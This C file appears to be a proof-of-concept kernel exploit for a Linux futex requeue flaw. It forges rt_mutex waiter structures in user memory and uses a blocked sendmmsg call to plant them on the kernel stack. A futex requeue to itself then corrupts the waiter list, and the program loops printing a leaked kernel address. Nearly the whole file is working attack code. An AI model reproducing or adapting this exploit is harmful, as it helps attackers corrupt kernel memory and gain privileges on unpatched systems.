#define _GNU_SOURCE
#include <stdio.h>
#include <errno.h>
#include <sys/mman.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <string.h>
#include <sys/socket.h>
#include <stddef.h>
#include <assert.h>
#include "futex.h"

#define BLOCKBUF "AAAAAAAA"
#define BLOCKBUFLEN strlen(BLOCKBUF)

#define DEFAULT_PRIO 120

int client_sockfd, server_sockfd;

struct mmsghdr msgvec;
struct iovec msg[7];

struct rt_mutex_waiter *fake_waiter1, *fake_waiter2;

int *non_pi_futex, *pi_futex;

void setup_waiters()
{
    fake_waiter1->list_entry.node_list.prev = &fake_waiter2->list_entry.node_list;
    fake_waiter1->list_entry.prio_list.prev = &fake_waiter2->list_entry.prio_list;
    fake_waiter1->list_entry.prio = DEFAULT_PRIO + 1;
}

void setup_msgs()
{
    int i;

    puts("[*] Setting up the messages for the kernel stack.");

    for (i = 0; i < sizeof(msg) / sizeof(msg[0]); i++)
    {
        msg[i].iov_base = &fake_waiter1->list_entry.prio_list;
        msg[i].iov_len = 1;
    }
    msgvec.msg_hdr.msg_iov = msg;
    msgvec.msg_hdr.msg_iovlen = sizeof(msg) / sizeof(msg[0]);
}

void setup_sockets()
{
    int fds[2];

    puts("[*] Creating the client and server sockets for kernel stack modification.");

    assert(socketpair(AF_UNIX, SOCK_STREAM, 0, fds) == 0);

    client_sockfd = fds[0];
    server_sockfd = fds[1];

    while (send(client_sockfd, BLOCKBUF, BLOCKBUFLEN, MSG_DONTWAIT) != -1)
        ;
    assert(errno == EWOULDBLOCK);
    return;
}

void alloc_futexes()
{
    uint32_t *futexes;

    puts("[*] Allocating the futexes.");

    assert((futexes = mmap(NULL, sizeof(uint32_t) * 2, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, -1, 0)) > 0);

    non_pi_futex = &futexes[0];
    pi_futex = &futexes[1];
}

void alloc_waiters()
{
    struct rt_mutex_waiter *waiters;

    puts("[*] Allocating the waiters.");

    assert((waiters = mmap(NULL, sizeof(struct rt_mutex_waiter) * 2, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, -1, 0)) > 0);

    fake_waiter1 = &waiters[0];
    fake_waiter2 = &waiters[1];
}

void forge_waiter()
{
    puts("[*] Placing the forged waiter on the mutex's waiters list.");

    assert(fwait_requeue(non_pi_futex, pi_futex, 0) == 0);
    assert(syscall(SYS_sendmmsg, client_sockfd, &msgvec, 1, 0) == 0);

    puts("sendmmsg exited; thread no longer blocks.");
}

int main()
{
    int pid;
    int child_count = 0;

    alloc_waiters();
    setup_waiters();
    setup_msgs();
    setup_sockets();
    alloc_futexes();

    flock(pi_futex);

    assert((pid = fork()) != -1);
    if (pid == 0)
    {
        forge_waiter();
        puts("[*] Forger thread exits.");
        exit(EXIT_SUCCESS);
    }
    else
        child_count++;

    sleep(1);
    assert(frequeue(non_pi_futex, pi_futex, 1, 0) == 1);

    assert((pid = fork()) != -1);
    if (pid == 0)
    {
        assert(flock(pi_futex) == 0);
        puts("[*] pi_futex reference holder thread exits.");
        exit(EXIT_SUCCESS);
    }
    else
        child_count++;

    sleep(1);
    *pi_futex = 0;
    frequeue(pi_futex, pi_futex, 1, 0);

    assert((pid = fork()) != -1);
    if (pid == 0)
    {
        assert(flock(pi_futex) == 0);
        puts("[*] List corrupter thread exits.");
        exit(EXIT_SUCCESS);
    }
    else
        child_count++;

    while (1)
    {
        printf("KERNEL INFO LEAK: %p\n", fake_waiter2->list_entry.prio_list.next);
        sleep(1);
    }
}
